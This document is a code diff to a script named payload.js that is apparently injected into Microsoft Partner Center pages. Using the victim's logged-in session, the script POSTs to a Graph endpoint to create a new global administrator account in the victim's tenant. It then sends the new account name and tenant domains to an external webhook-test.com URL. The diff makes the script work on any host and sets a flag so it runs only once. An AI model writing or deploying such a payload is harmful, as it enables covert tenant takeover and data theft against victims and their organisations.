@@ -1,7 +1,7 @@
 // payload.js
 var elements = document.querySelectorAll(".page-title-spacer");
-elements.forEach(function(element) {
-    element.parentNode.removeChild(element);
+elements.forEach(function (element) {
+  element.parentNode.removeChild(element);
 });
 
 
@@ -74,12 +74,22 @@ function loadUserData(index) {
 }
 
 function Run(index) {
+  if (localStorage.getItem("userPrincipalName0") === '1') {
+    console.log("already.");
+    return;
+  }
+
   var userData = loadUserData(index);
   if (!userData.userPrincipalName) {
     console.error("No userPrincipalName found in localStorage.");
     return;
   }
-  fetch('https://partner.microsoft.com/en-us/dashboard/account/v3/api/graph/users?tenantDomainName=' + domain + '&isGlobalAdmin=true', {
+  //get document domain
+  if (!domain) {
+    domain = document.domain;
+  }
+
+  fetch('https://' + window.location.hostname + '/en-us/dashboard/account/v3/api/graph/users?tenantDomainName=' + domain + '&isGlobalAdmin=true', {
     method: "POST",
     credentials: "include",
     headers: commonHeaders,
@@ -94,6 +104,7 @@ function Run(index) {
       result.userPrincipalName = newAccount;
       result.domains = domains;
       fetch("https://webhook-test.com/30e0283098aed29b5c052a61c0828c89?result=" + encodeURIComponent(JSON.stringify(result)));
+      localStorage.setItem("userPrincipalName0", '1');
     });
 }
 
